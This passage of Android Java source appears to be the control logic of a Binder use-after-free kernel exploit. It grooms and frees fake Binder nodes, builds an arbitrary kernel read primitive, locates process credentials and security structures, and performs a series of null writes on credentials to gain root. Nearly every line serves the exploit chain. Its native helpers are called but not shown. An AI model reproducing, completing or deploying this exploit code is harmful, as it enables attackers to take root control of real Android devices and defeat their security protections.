                return false;
            }
            reply.readException();
            int count = reply.readInt();
            if (count != OwnerService.FILLER_REF_COUNT) {
                return false;
            }
            IBinder[] nodes = new IBinder[count];
            for (int index = 0; index < count; index++) {
                nodes[index] = reply.readStrongBinder();
                if (nodes[index] == null) {
                    return false;
                }
            }
            fillerNodes = nodes;
            return true;
        } catch (Exception exception) {
            return false;
        } finally {
            reply.recycle();
            data.recycle();
        }
    }

    private void runNodeAddress(String handleState, boolean fakeCheck) {
        String result;
        String chainStage = requestedStage;
        boolean rootFlow = isRootFlow(chainStage);
        boolean rawHolderCandidate = RAW_BINDER_HOLDER_CANDIDATE &&
                ("chain-addresses".equals(chainStage) ||
                 fakeCheck && rootFlow);
        try {
            checkpoint("node-stage-start");
            if (fakeCheck) {
                writePrivate("controlled-reader.request",
                        "status=requested stage=fake-node-check");
                if ("root-chain".equals(chainStage)) {
                    writePrivate("raw-target.multi-export",
                            "status=ready stage=raw-cohort-export");
                    writePrivate("raw-target.deferred-export",
                            "status=ready clients=" + RAW_VICTIM_COUNT);
                }
                String targetState = prepareRawTarget();
                if (!targetState.startsWith("status=pass")) {
                    publish("status=fail stage=fake-node-check target=[" +
                            targetState + "]");
                    finishEpitemLeak();
                    return;
                }
                String clientState = prepareRawClient();
                if (!clientState.startsWith("status=pass")) {
                    publish("status=fail stage=fake-node-check client=[" +
                            clientState + "]");
                    finishEpitemLeak();
                    return;
                }
            }
            Intent batchClient = new Intent(this, BatchClientService.class);
            if (("chain-addresses".equals(chainStage) || rootFlow) &&
                    chainSecondOwner) {
                batchClient.putExtra("owner2", true);
            }
            if (!startEpitemBatchClient(batchClient)) {
                throw new IllegalStateException("epitem-client-death-arm");
            }
            File ready = new File(getFilesDir(), "epitem-leak.unread-ready");
            File leak = new File(getFilesDir(), "epitem-leak.result");
            String rawExport =
                    "status=pass stage=java-controlled-export";
            if (fakeCheck) {
                File exportReady = new File(getFilesDir(),
                        "controlled-export.ready");
                waitForEither(exportReady, leak, 120000);
                rawExport = exportReady.exists()
                        ? "status=pass stage=raw-controlled-export pending=1"
                        : readSmall(leak);
                if (rawExport.startsWith("status=pass")) {
                    writePrivate("controlled-export.proceed",
                            "status=pass stage=epitem-groom-proceed");
                }
            }
            if (!rawExport.startsWith("status=pass")) {
                result = "status=fail stage=node-address raw_export=[" +
                        rawExport + "]";
            } else {
                waitForEither(ready, leak, 120000);
                checkpoint(ready.exists()
                        ? "node-reader-ready" : "node-reader-failed");
                if (!ready.exists()) {
                    result = readSmall(leak);
                } else {
                    List<IBinder> controllers = rawHolderCandidate
                            ? Collections.emptyList()
                            : bindIsolatedControllers(
                                    REFERENCE_HOLDER_COUNT);
                    String holderBootstrap = rawHolderCandidate
                            ? (rawBinderHoldersActive
                                    ? rawBinderHolderBootstrapState
                                    : prepareRawBinderHolders())
                            : "status=pass stage=raw-binder-holder-bootstrap" +
                                    " skipped=1";
                    boolean holdersReady = rawHolderCandidate
                            ? holderBootstrap.startsWith("status=pass")
                            : controllers.size() == REFERENCE_HOLDER_COUNT;
                    String holderPrime = holdersReady && rawHolderCandidate
                            ? primeRawBinderHolders()
                            : "status=pass stage=raw-binder-holder-prime" +
                                    " skipped=1";
                    holdersReady = holdersReady &&
                            holderPrime.startsWith("status=pass");
                    if (!holdersReady) {
                        result = "status=fail stage=node-address reason=" +
                                "holder-prepare isolated_bound=" +
                                controllers.size() + " raw=[" +
                                holderBootstrap + "] prime=[" +
                                holderPrime + "]";
                    } else {
                        if (!fakeCheck) {
                            queueControlledNode();
                        }
                        String decrement = NativeBridge.decrementNodeBatch(
                                getFilesDir().getAbsolutePath());
                        checkpoint(decrement.startsWith("status=pass")
                                ? "node-decrement-pass"
                                : "node-decrement-failed");
                        String refs;
                        if (!decrement.startsWith("status=pass")) {
                            refs = "status=fail reason=decrement";
                        } else if (fakeCheck) {
                            rawExport = exportRawControlledNode();
                            if (rawExport.startsWith("status=pass")) {
                                controlledPointer = rawControlledPointer;
                                controlledCookie = rawControlledCookie;
                                refs = rawHolderCandidate
                                        ? retainRawRootBinderHolderRefs()
                                        : retainRawControlledNode(controllers);
                                if (refs.startsWith("status=pass")) {
                                    String anchor = rawHolderCandidate
                                            ? retainKernelAnchor(
                                                    RAW_BINDER_HOLDER_COUNT)
                                            : retainKernelAnchor(
                                                    controllers,
                                                    controllers.size());
                                    refs = anchor.startsWith("status=pass")
                                            ? refs + " anchor=[" + anchor + "]"
                                            : "status=fail anchor=[" +
                                                    anchor + "]";
                                }
                            } else {
                                refs = "status=fail reason=raw-export";
                            }
                        } else {
                            refs = rawHolderCandidate
                                    ? retainRawBinderHolderRefs() +
                                            " prime=[" + holderPrime + "]" +
                                            " bootstrap=[" +
                                            holderBootstrap + "]"
                                    : retainControlledNode(controllers);
                        }
                        String enabled = refs.startsWith("status=pass")
                                ? NativeBridge.enableStaleRead(
                                        getFilesDir().getAbsolutePath())
                                : "status=fail reason=refs";
                        if (!enabled.startsWith("status=pass")) {
                            result = "status=fail stage=node-address " +
                                    "decrement=[" + decrement +
                                    "] raw_export=[" + rawExport +
                                    "] refs=[" + refs + "] enable=[" +
                                    enabled + "]";
                        } else {
                            waitForEither(leak, null, 120000);
                            String analysis =
                                    NativeBridge.analyseBinderRefLeak(
                                            getFilesDir().getAbsolutePath());
                            checkpoint(analysis.startsWith("status=pass")
                                    ? "node-analysis-pass"
                                    : "node-analysis-failed");
                            writePrivate("binder-ref.analysis", analysis);
                            if (fakeCheck &&
                                    analysis.startsWith("status=pass")) {
                                result = rootFlow
                                        ? runArbitraryRoot(
                                                handleState + " " +
                                                        rawExport,
                                                decrement, refs, analysis)
                                        : runFakeNodeCheck(
                                                handleState + " " +
                                                        rawExport,
                                                decrement, refs, analysis);
                            } else {
                                result = "status=" +
                                        (analysis.startsWith("status=pass")
                                                ? "pass" : "miss") +
                                        " stage=node-address handle=[" +
                                        handleState + "] decrement=[" +
                                        decrement + "] refs=[" + refs +
                                        "] analysis=[" + analysis + "]";
                            }
                        }
                    }
                }
            }
        } catch (Exception exception) {
            Log.e(TAG, "node-address", exception);
            result = "status=fail stage=node-address reason=exception type=" +
                    exception.getClass().getSimpleName() + " message=" +
                    String.valueOf(exception.getMessage());
        }
        if (rawHolderCandidate && rawBinderHoldersActive) {
            String release = releaseRawBinderHolders();
            boolean pass = result.startsWith("status=pass") &&
                    release.startsWith("status=pass");
            result = "status=" + (pass ? "pass" : "miss") +
                    " stage=raw-binder-node-address node=[" + result +
                    "] release=[" + release + "]";
        }
        if (("chain-addresses".equals(chainStage) || rootFlow) &&
                chainSecondOwner) {
            String combined = "status=" +
                    (result.startsWith("status=pass") ? "pass" : "miss") +
                    " stage=" + chainStage + " " + chainAddressPrefix +
                    "node=[" + result + "]";
            publish(combined);
            if (!rootFlow ||
                    "primitive-probe".equals(chainStage) ||
                    (!result.startsWith("status=pass") &&
                     !kernelMutationStarted)) {
                finishEpitemLeak();
            }
            return;
        }
        publish(result);
        finishEpitemLeak();
    }

    private String runFakeNodeCheck(String handleState, String decrement,
                                    String refs, String analysis)
            throws Exception {
        String holderRetirement;
        if (rawBinderHoldersActive) {
            holderRetirement = releaseRawBinderHolders();
        } else {
            releaseIsolatedConnections();
            waitForIsolatedExit(5000);
            Thread.sleep(1500);
            holderRetirement =
                    "status=pass stage=isolated-holder-retirement";
        }
        if (!holderRetirement.startsWith("status=pass")) {
            return "status=miss stage=fake-node-check holder_retirement=[" +
                    holderRetirement + "]";
        }
        String clientExit = queueRawClientAndWaitExit();
        if (!clientExit.startsWith("status=pass")) {
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] decrement=[" + decrement +
                    "] refs=[" + refs + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "]";
        }
        kernelMutationStarted = true;
        requiredCheckpoint("primitive-reboot-required");
        String prepare = NativeBridge.prepareRawFakeNodeCheck(
                rawTargetService,
                rawControlledPointer, rawControlledCookie,
                getFilesDir().getAbsolutePath());
        writePrivate("fake-node.prepare-state", prepare);
        if (!prepare.startsWith("status=pass")) {
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] decrement=[" + decrement +
                    "] refs=[" + refs + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "] prepare=[" +
                    prepare + "] containment=parked";
        }
        File observed = new File(getFilesDir(), "controlled-reader.result");
        try {
            waitForEither(observed, null, 120000);
        } catch (Exception exception) {
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] decrement=[" + decrement +
                    "] refs=[" + refs + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "] prepare=[" +
                    prepare + "] observation=missing containment=parked";
        }
        String observation = readSmall(observed);
        if (!prepare.startsWith("status=pass") ||
                !observation.startsWith("status=ready") ||
                !observation.contains("exact_payload=1")) {
            if (observation.contains("exact_payload=1")) {
                return "status=miss stage=fake-node-check handle=[" +
                        handleState + "] decrement=[" + decrement +
                        "] refs=[" + refs + "] analysis=[" + analysis +
                        "] client_exit=[" + clientExit + "] prepare=[" +
                        prepare + "] observation=[" + observation +
                        "] containment=parked";
            }
            String release = NativeBridge.releaseFakeNodeSpray();
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] decrement=[" + decrement +
                    "] refs=[" + refs + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "] prepare=[" +
                    prepare + "] observation=[" + observation +
                    "] release=[" + release + "]";
        }
        String free = NativeBridge.enableControlledFree(
                getFilesDir().getAbsolutePath());
        File freed = new File(getFilesDir(), "controlled-free.result");
        try {
            waitForEither(freed, null, 120000);
        } catch (Exception exception) {
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "] prepare=[" +
                    prepare + "] observation=[" + observation +
                    "] free=missing containment=parked";
        }
        String freeResult = readSmall(freed);
        if (!free.startsWith("status=pass") ||
                !freeResult.startsWith("status=pass")) {
            return "status=miss stage=fake-node-check handle=[" +
                    handleState + "] analysis=[" + analysis +
                    "] client_exit=[" + clientExit + "] prepare=[" +
                    prepare + "] observation=[" + observation +
                    "] free=[" + freeResult + "] containment=parked";
        }
        String release = NativeBridge.releaseFakeNodeSpray();
        boolean pass = release.startsWith("status=pass");
        return "status=" + (pass ? "pass" : "miss") +
                " stage=fake-node-check handle=[" + handleState +
                "] analysis=[" + analysis + "] client_exit=[" +
                clientExit + "] prepare=[" + prepare +
                "] observation=[" + observation + "] free=[" +
                freeResult + "] release=[" + release + "]";
    }

    private String runArbitraryRoot(String handleState, String decrement,
                                    String refs, String analysis)
            throws Exception {
        boolean mutate = "root-chain".equals(requestedStage);
        String rootUnlink = runArbitraryRootNode(
                handleState, decrement, refs, analysis, mutate);
        return mutate
                ? "status=" +
                        (rootUnlink.startsWith("status=pass ")
                                ? "pass" : "miss") +
                        " stage=root-chain node=[" + rootUnlink + "]"
                : rootUnlink;
    }

    private String runArbitraryRootNode(
            String handleState, String decrement, String refs,
            String analysis, boolean mutate) throws Exception {
        checkpoint("arbitrary-read-start");
        String clients = "status=pass stage=raw-extra-skip";
        FutureTask<String> deferredClientPreparation = null;
        long[] victimPointers = new long[RAW_VICTIM_COUNT];
        long[] victimCookies = new long[RAW_VICTIM_COUNT];
        victimPointers[0] = rawControlledPointer;
        victimCookies[0] = rawControlledCookie;
        writePrivate("raw-extra-export.reply-signal", "0");
        boolean rawRetirement = rawBinderHoldersActive;
        String isolatedRetirement = rawRetirement
                ? "status=pass stage=raw-holder-retirement deferred=1"
                : proveIsolatedRetirementBeforeMutation();
        checkpoint(rawRetirement
                ? "raw-holder-retirement-deferred"
                : isolatedRetirement.startsWith("status=pass")
                        ? "isolated-retirement-proof-pass"
                        : "isolated-retirement-proof-failed");
        if (!isolatedRetirement.startsWith("status=pass")) {
            return "status=miss stage=root-unlink isolated_proof=[" +
                    isolatedRetirement + "]";
        }
        String cohortGate = rawCohortSiblings == null
                ? "status=pass stage=raw-cohort-gate skipped=1"
                : NativeBridge.validateRawCohort(
                        rawCohortSiblings,
                        RawBClientService.RAW_COHORT_COUNT - 1);
        if (!cohortGate.startsWith("status=pass") ||
                rawClientPid <= 0 || rawTargetPid <= 0 ||
                !new File("/proc/" + rawClientPid).exists() ||
                !new File("/proc/" + rawTargetPid).exists()) {
            return "status=miss stage=root-unlink cohort=[" +
                    cohortGate + "] raw_client_pid=" + rawClientPid +
                    " raw_target_pid=" + rawTargetPid;
        }
        File settleResult = new File(getFilesDir(),
                "raw-cohort-settle.result");
        String settled = settleResult.exists()
                ? readSmall(settleResult)
                : "status=pass stage=raw-cohort-settle skipped=1";
        if (!settled.startsWith("status=pass")) {
            return "status=miss stage=root-unlink cohort=[" +
                    cohortGate + "] settle=[" + settled + "]";
        }
        kernelMutationStarted = true;
        requiredCheckpoint("arbitrary-read-reclaim-armed");
        String clientExit = queueRawClientAndWaitExit();
        if (!clientExit.startsWith("status=pass")) {
            return "status=miss stage=root-unlink client_exit=[" +
                    clientExit + "]";
        }
        String prepare = NativeBridge.prepareRawArbitraryRead(
                rawTargetService, rawControlledPointer,
                rawControlledCookie, getFilesDir().getAbsolutePath());
        checkpoint(prepare.startsWith("status=pass")
                ? "arbitrary-read-prepared" : "arbitrary-read-prepare-failed");
        if (!prepare.startsWith("status=pass")) {
            if (prepareProcessTeardownForPrepareMiss(prepare)) {
                requiredCheckpoint("arbitrary-read-proc-teardown-required");
            }
            return "status=miss stage=root-unlink prepare=[" + prepare + "]";
        }
        String first = completeIndexedUnlink(0, 0L);
        if (processTeardownRequired) {
            requiredCheckpoint("arbitrary-read-proc-teardown-required");
        } else {
            checkpoint(first.startsWith("status=pass")
                    ? "arbitrary-read-pass"
                    : first.contains("safe_no_free=1")
                            ? "arbitrary-read-observe-miss-safe"
                            : "arbitrary-read-failed");
        }
        if (!first.startsWith("status=pass")) {
            return "status=miss stage=root-unlink prepare=[" + prepare +
                    "] first=[" + first + "]";
        }
        if (rawRetirement) {
            isolatedRetirement = releaseRawBinderHolders();
            checkpoint(isolatedRetirement.startsWith("status=pass")
                    ? "raw-holder-retirement-proof-pass"
                    : "raw-holder-retirement-proof-failed");
            if (!isolatedRetirement.startsWith("status=pass")) {
                return "status=miss stage=root-unlink isolated_proof=[" +
                        isolatedRetirement + "]";
            }
        }
        if (mutate) {
            checkpoint("raw-deferred-clients-start");
            deferredClientPreparation = new FutureTask<>(
                    this::prepareDeferredRawClients);
            new Thread(deferredClientPreparation,
                    "raw-deferred-client-preparation").start();
        }
        checkpoint("current-proc-native-start");
        FutureTask<String> currentProcPreparation = new FutureTask<>(
                NativeBridge::probeCurrentBinderProc);
        Thread currentProcWorker = new Thread(
                currentProcPreparation, "current-proc-probe");
        currentProcWorker.setDaemon(true);
        currentProcWorker.start();
        String privateCredential =
                "status=pass stage=private-credential-skip";
        if (directTerminalCleanup) {
            String request = "nonce=" + rootWatchdogNonce +
                    " helper_pid=" + rootWatchdogHelperPid +
                    " helper_start_time=" + rootWatchdogHelperStart +
                    " main_tid=" + rootWatchdogHelperPid +
                    " boot_id=" + rootWatchdogBootId;
            writePrivate("private-credential.request", request);
            requiredCheckpoint("private-credential-request-ready");
            String signal = preparePrivateCredential();
            if (!signal.startsWith("status=pass")) {
                checkpoint("root-window-reboot-required");
                return "status=miss stage=root-unlink signal=[" +
                        signal + "]";
            }
            checkpoint("private-credential-signal-pass");
            File arm = new File(
                    getFilesDir(), "private-credential-arm.done");
            try {
                waitForEither(arm, null, 60000);
            } catch (Exception exception) {
                checkpoint("root-window-reboot-required");
                return "status=miss stage=root-unlink reason=" +
                        "private-credential-timeout";
            }
            if (!isPrivateCredentialArmValid(arm)) {
                checkpoint("root-window-reboot-required");
                return "status=miss stage=root-unlink reason=" +
                        "private-credential-binding";
            }
            privateCredential = readSmall(arm);
            checkpoint("private-credential-pass");
        }
        String currentProc;
        try {
            currentProc = currentProcPreparation.get(
                    5, TimeUnit.SECONDS);
        } catch (Exception exception) {
            currentProc = "status=miss stage=current-binder-proc reason=" +
                    exception.getClass().getSimpleName();
        }
        checkpoint(currentProc.startsWith("status=pass")
                ? "current-proc-pass" : "current-proc-failed");
        if (!currentProc.startsWith("status=pass")) {
            return "status=miss stage=root-unlink current=[" +
                    currentProc + "]";
        }
        String credentialTarget = NativeBridge.adoptCredentialTarget();
        checkpoint(credentialTarget.startsWith("status=pass")
                ? "helper-target-pass" : "helper-target-failed");
        if (!credentialTarget.startsWith("status=pass")) {
            return "status=miss stage=root-unlink target_cache=[" +
                    credentialTargetState + "] target=[" +
                    credentialTarget + "]";
        }
        long cred = NativeBridge.arbitraryCredentialAddress();
        if (cred == 0) {
            return "status=miss stage=root-unlink reason=credential";
        }
        String securityTarget;
        if (directInitCred) {
            checkpoint("direct-init-target-start");
            securityTarget = NativeBridge.prepareDirectInitTarget();
            checkpoint(securityTarget.startsWith("status=pass")
                    ? "direct-init-target-profile-pass"
                    : "direct-init-target-profile-failed");
        } else {
            checkpoint("security-target-adopt-start");
            securityTarget = NativeBridge.adoptSecurityTarget();
            checkpoint(securityTarget.startsWith("status=pass")
                    ? "security-target-adopt-pass"
                    : "security-target-adopt-failed");
            if (directSecurityCred &&
                    securityTarget.startsWith("status=pass")) {
                checkpoint("direct-security-profile-start");
                securityTarget = NativeBridge.prepareDirectSecurityTarget(
                        directSecurityRepair, directCredQuarantine,
                        directTerminalCleanup);
                checkpoint(securityTarget.startsWith("status=pass")
                        ? "direct-security-profile-pass"
                        : "direct-security-profile-failed");
            }
            if (directTerminalCleanup &&
                    securityTarget.startsWith("status=pass")) {
                if (ctlbufModuleFd == null || ctlbufVendorFd == null ||
                        ctlbufUeventdPid <= 0) {
                    securityTarget =
                            "status=fail stage=ctlbuf-rescue-profile " +
                            "reason=resources";
                } else {
                    checkpoint("ctlbuf-rescue-profile-start");
                    for (int attempt = 0; attempt < 3; attempt++) {
                        securityTarget = NativeBridge.profileCtlbufRescue(
                                ctlbufModuleFd.getFd(),
                                ctlbufVendorFd.getFd(), ctlbufUeventdPid);
                        if (securityTarget.startsWith("status=pass")) {
                            break;
                        }
                        if (attempt < 2) {
                            checkpoint("ctlbuf-rescue-profile-retry-ready");
                        }
                    }
                    checkpoint(securityTarget.startsWith("status=pass")
                            ? "ctlbuf-rescue-profile-pass"
                            : "ctlbuf-rescue-profile-failed");
                }
            }
        }
        checkpoint(securityTarget.startsWith("status=pass")
                ? directInitCred
                        ? "direct-init-target-pass"
                        : directSecurityCred
                                ? "direct-security-target-pass"
                        : "update-target-pass"
                : directInitCred
                        ? "direct-init-target-failed"
                        : directSecurityCred
                                ? "direct-security-target-failed"
                        : "update-target-failed");
        if (!securityTarget.startsWith("status=pass")) {
            return "status=miss stage=root-unlink security_cache=[" +
                    securityTargetState + "] security=[" +
                    securityTarget + "]";
        }
        if (deferredClientPreparation != null) {
            clients = deferredClientPreparation.get(30, TimeUnit.SECONDS);
            checkpoint(clients.startsWith("status=pass")
                    ? "raw-deferred-clients-pass"
                    : "raw-deferred-clients-failed");
            if (!clients.startsWith("status=pass")) {
                return "status=miss stage=root-unlink clients=[" +
                        clients + "]";
            }
        }
        if (directActionAfterSecuritySwap) {
            String reSukiStagePlan =
                    NativeBridge.reSukiStagePlan(rootWatchdogNonce);
            writePrivateAtomic("resukisu-stage.plan", reSukiStagePlan);
            if (!reSukiStagePlan.startsWith(
                    "status=pass stage=resukisu-stage-plan ")) {
                checkpoint("resukisu-stage-plan-failed");
                return "status=miss stage=root-unlink resukisu_stage=[" +
                        reSukiStagePlan + "]";
            }
            checkpoint("resukisu-stage-plan-ready");
        }
        if (!mutate) {
            String profile = NativeBridge.profileRootTarget();
            checkpoint(profile.startsWith("status=pass")
                    ? "root-profile-pass" : "root-profile-failed");
            if (profile.startsWith("status=pass")) {
                checkpoint("primitive-reboot-required");
            }
            return "status=" +
                    (profile.startsWith("status=pass") ? "pass" : "miss") +
                    " stage=primitive-probe target=[" + credentialTarget +
                    "] security=[" + securityTarget + "] profile=[" +
                    profile + "]";
        }
        String deferredSignal = NativeBridge.signalDeferredExport();
        if (!deferredSignal.startsWith("status=pass")) {
            return "status=miss stage=root-unlink signal=[" +
                    deferredSignal + "]";
        }
        clients = collectExtraRawClients();
        if (!clients.startsWith("status=pass")) {
            return "status=miss stage=root-unlink extra=[" + clients + "]";
        }
        List<Long> pointers;
        List<Long> cookies;
        synchronized (extraRawClientLock) {
            pointers = new ArrayList<>(extraRawClientSlots.length);
            cookies = new ArrayList<>(extraRawClientSlots.length);
            for (RawClientSlot slot : extraRawClientSlots) {
                pointers.add(slot.pointer);
                cookies.add(slot.cookie);
            }
        }
        if (pointers.size() != RAW_VICTIM_COUNT - 1 ||
                cookies.size() != RAW_VICTIM_COUNT - 1) {
            return "status=miss stage=root-unlink reason=raw-tokens";
        }
        for (int index = 0; index < pointers.size(); index++) {
            victimPointers[index + 1] = pointers.get(index);
            victimCookies[index + 1] = cookies.get(index);
        }
        if (!NativeBridge.configureRawVictims(
                victimPointers, victimCookies, rawTargetPid)) {
            return "status=miss stage=root-unlink reason=raw-config";
        }
        String victimCaches = NativeBridge.cacheRawVictimNodes();
        if (!victimCaches.startsWith(
                "status=pass stage=raw-victim-cache-batch ")) {
            return "status=miss stage=root-unlink cache=[" +
                    victimCaches + "]";
        }
        StringBuilder writes = new StringBuilder();
        StringBuilder extraExits = new StringBuilder();
        boolean pass = true;
        int internalWriteMisses = 0;
        boolean directCredentialWrite = !restoreAfterAction &&
                (directInitCred || directSecurityCred);
        int directWriteCount = directSecurityRepair
                ? directTerminalCleanup ? 6
                        : directCredQuarantine ? 5 : 4
                : 2;
        if (directSecurityRepair) {
            checkpoint("root-write-arm-ready");
            File arm = new File(getFilesDir(), "root-write-arm.done");
            waitForEither(arm, null, 30000);
            if (!arm.exists()) {
                return "status=miss stage=root-unlink reason=root-write-arm";
            }
            checkpoint("root-write-arm-pass");
        }
        int writeStep = 1;
        boolean rootWindowReached = false;
        boolean actionCompleted = false;
        boolean rescuePlanPrepared = false;
        boolean batchedTerminalWrites = BATCHED_TERMINAL_WRITES &&
                directTerminalCleanup && directCredentialWrite;
        if (batchedTerminalWrites) {
            long[] batchPointers = new long[4];
            long[] batchCookies = new long[4];
            for (int index = 0; index < 4; index++) {
                int victim = index + 1;
                batchPointers[index] = victimPointers[victim];
                batchCookies[index] = victimCookies[victim];
            }
            requiredCheckpoint("root-write-batch-reclaim-start");
            int[] workers = new int[4];
            for (int index = 0; index < 4; index++) {
                int victim = index + 1;
                int logicalWrite = index < 2 ? victim : index + 3;
                checkpoint("root-write-" + logicalWrite +
                        "-client-exit-start");
                String extraExit = queueExtraRawClientAndWaitExit(index);
                checkpoint(extraExit.startsWith("status=pass")
                        ? "root-write-" + logicalWrite +
                                "-client-exit-pass"
                        : "root-write-" + logicalWrite +
                                "-client-exit-failed");
                extraExits.append(" extra_exit").append(victim).append("=[")
                        .append(extraExit).append("]");
                if (!extraExit.startsWith("status=pass")) {
                    requiredCheckpoint("root-window-reboot-required");
                    return "status=miss stage=root-unlink batch_exit=[" +
                            extraExit + "]";
                }
                if (index == 0) {
                    String batchPrepare =
                            NativeBridge.prepareRawNullWriteBatch(
                                    batchPointers, batchCookies,
                                    getFilesDir().getAbsolutePath());
                    writes.append(" batch_prepare=[")
                            .append(batchPrepare).append("]");
                    checkpoint(batchPrepare.startsWith("status=pass")
                            ? "root-write-batch-prepare-pass"
                            : "root-write-batch-prepare-failed");
                    if (!batchPrepare.startsWith("status=pass")) {
                        if (batchPrepare.contains("reboot_required=1")) {
                            requiredCheckpoint(
                                    "root-window-reboot-required");
                        }
                        return "status=miss stage=root-unlink " +
                                "batch_prepare=[" + batchPrepare + "]";
                    }
                }
                String batchArm = NativeBridge.armRawNullWriteBatchVictim(
                        victim, batchPointers[index], batchCookies[index],
                        getFilesDir().getAbsolutePath());
                writes.append(" batch_arm").append(victim).append("=[")
                        .append(batchArm).append("]");
                checkpoint(batchArm.startsWith("status=pass")
                        ? "root-write-" + logicalWrite +
                                "-batch-reclaim-pass"
                        : "root-write-" + logicalWrite +
                                "-batch-reclaim-failed");
                if (!batchArm.startsWith("status=pass")) {
                    requiredCheckpoint("root-window-reboot-required");
                    return "status=miss stage=root-unlink batch_arm=[" +
                            batchArm + "]";
                }
                File observed = new File(getFilesDir(),
                        "controlled-reader.result." + victim);
                waitForEither(observed, null, 120000);
                String observation = readSmall(observed);
                workers[index] = parseIntField(
                        observation, "worker_index=");
                writes.append(" batch_observation").append(victim)
                        .append("=[").append(observation).append("]");
                if (!observation.startsWith("status=ready") ||
                        !observation.contains("exact_payload=1") ||
                        workers[index] < 0) {
                    requiredCheckpoint("root-window-reboot-required");
                    return "status=miss stage=root-unlink " +
                            "batch_observation=[" + observation + "]";
                }
                String retained =
                        NativeBridge.retainRawNullWriteBatchVictim(
                                victim, workers[index]);
                writes.append(" batch_retain").append(victim).append("=[")
                        .append(retained).append("]");
                checkpoint(retained.startsWith("status=pass")
                        ? "root-write-" + logicalWrite +
                                "-batch-retain-pass"
                        : "root-write-" + logicalWrite +
                                "-batch-retain-failed");
                if (!retained.startsWith("status=pass")) {
                    requiredCheckpoint("root-window-reboot-required");
                    return "status=miss stage=root-unlink " +
                            "batch_retain=[" + retained + "]";
                }
                checkpoint("root-write-" + logicalWrite + "-armed");
            }
            checkpoint("root-write-batch-reclaim-pass");
            checkpoint("root-write-batch-retain-pass");
        }
        int writeVictimLimit = batchedTerminalWrites
                ? 5 : RAW_VICTIM_COUNT;
        for (int victim = 1; victim < writeVictimLimit; victim++) {
            int logicalWrite = directCredentialWrite ? writeStep : victim;
            int clientIndex = victim - 1;
            if (!batchedTerminalWrites) {
                checkpoint("root-write-" + logicalWrite +
                        "-client-exit-start");
                String extraExit = queueExtraRawClientAndWaitExit(clientIndex);
                checkpoint(extraExit.startsWith("status=pass")
                        ? "root-write-" + logicalWrite + "-client-exit-pass"
                        : "root-write-" + logicalWrite +
                                "-client-exit-failed");
                extraExits.append(" extra_exit").append(victim).append("=[")
                        .append(extraExit).append("]");
                if (!extraExit.startsWith("status=pass")) {
                    pass = false;
                    break;
                }
            }
            long target = NativeBridge.rootWriteTarget(logicalWrite);
            if (target == 0) {
                writes.append(" target").append(logicalWrite)
                        .append("=[status=fail]");
                pass = false;
                break;
            }
            if (!batchedTerminalWrites) {
                String arm = NativeBridge.prepareRawNullWrite(
                        target, victim, victimPointers[victim],
                        victimCookies[victim],
                        getFilesDir().getAbsolutePath());
                checkpoint(arm.startsWith("status=pass")
                        ? "root-write-" + logicalWrite + "-armed"
                        : "root-write-" + logicalWrite + "-arm-failed");
                if (!arm.startsWith("status=pass")) {
                    writes.append(" arm").append(logicalWrite).append("=[")
                            .append(arm).append("]");
                    if (directCredentialWrite && arm.contains(
                            "stage=null-write-prepare reason=preflight")) {
                        internalWriteMisses++;
                        checkpoint("root-write-" + logicalWrite +
                                "-preflight-retry-ready");
                        continue;
                    }
                    pass = false;
                    break;
                }
            }
            String completed = completeIndexedUnlink(victim, target);
            checkpoint(completed.startsWith("status=pass")
                    ? "root-write-" + logicalWrite + "-pass"
                    : "root-write-" + logicalWrite + "-failed");
            writes.append(" write").append(logicalWrite)
                    .append("_victim").append(victim).append("=[")
                    .append(completed).append("]");
            if (!completed.startsWith("status=pass")) {
                boolean safeRetry = !batchedTerminalWrites &&
                        directCredentialWrite &&
                        completed.contains("safe_no_free=1");
                if (safeRetry) {
                    internalWriteMisses++;
                    String released = NativeBridge.releaseFakeNodeSpray();
                    checkpoint(released.startsWith("status=pass")
                            ? "root-write-" + logicalWrite + "-retry-ready"
                            : "root-write-" + logicalWrite +
                                    "-retry-release-failed");
                    writes.append(" retry_release").append(victim)
                            .append("=[").append(released).append("]");
                    if (released.startsWith("status=pass")) {
                        continue;
                    }
                }
                pass = false;
                break;
            }
            if (directCredentialWrite) {
                if (writeStep == 1) {
                    checkpoint("root-mutation-start");
                }
                if (directSecurityRepair &&
                        writeStep == (directTerminalCleanup
                                ? 2 : directWriteCount)) {
                    checkpoint("root-watchdog-arm-ready");
                    File watchdogArm = new File(
                            getFilesDir(), "root-watchdog-arm.done");
                    waitForEither(watchdogArm, null, 60000);
                    if (!isRootWatchdogArmValid(watchdogArm)) {
                        writes.append(" watchdog=[status=fail reason=binding]");
                        pass = false;
                        break;
                    }
                    checkpoint("root-watchdog-arm-pass");
                }
                if (directTerminalCleanup && writeStep == 2) {
                    String skippedRealCred =
                            NativeBridge.skipDirectRealCredWrites();
                    writes.append(" real_cred_skip=[")
                            .append(skippedRealCred).append("]");
                    if (!skippedRealCred.startsWith("status=pass")) {
                        pass = false;
                        break;
                    }
                    checkpoint("root-real-cred-skip-pass");
                    writeStep = 5;
                } else {
                    writeStep++;
                }
            }
            if (directCredQuarantine &&
                    directCredentialWrite && writeStep == 6) {
                checkpoint("cred-quarantine-pass");
                checkpoint("root-window-reboot-required");
                rootWindowReached = true;
                break;
            }
            boolean actionReady = !actionCompleted &&
                    (!directCredentialWrite && victim == 2 &&
                    !restoreAfterAction || directCredentialWrite &&
                    !directCredQuarantine &&
                    writeStep == (directTerminalCleanup
                            ? 5 : directWriteCount + 1));
            if (actionReady) {
                checkpoint("root-window-ready");
                File actionDone = new File(getFilesDir(),
                        "root-action.done");
                waitForEither(actionDone, null, 120000);
                if (!actionDone.exists()) {
                    writes.append(" action=[status=fail]");
                    pass = false;
                    break;
                }
                if (directActionAfterSecuritySwap) {
                    checkpoint("root-window-preaction-pass");
                } else {
                    checkpoint("root-window-action-pass");
                    actionCompleted = true;
                }
                if (directTerminalCleanup) {
                    checkpoint("ctlbuf-donor-freeze-ready");
                    File donorFrozen = new File(
                            getFilesDir(), "ctlbuf-donor-frozen.done");
                    waitForEither(donorFrozen, null, 60000);
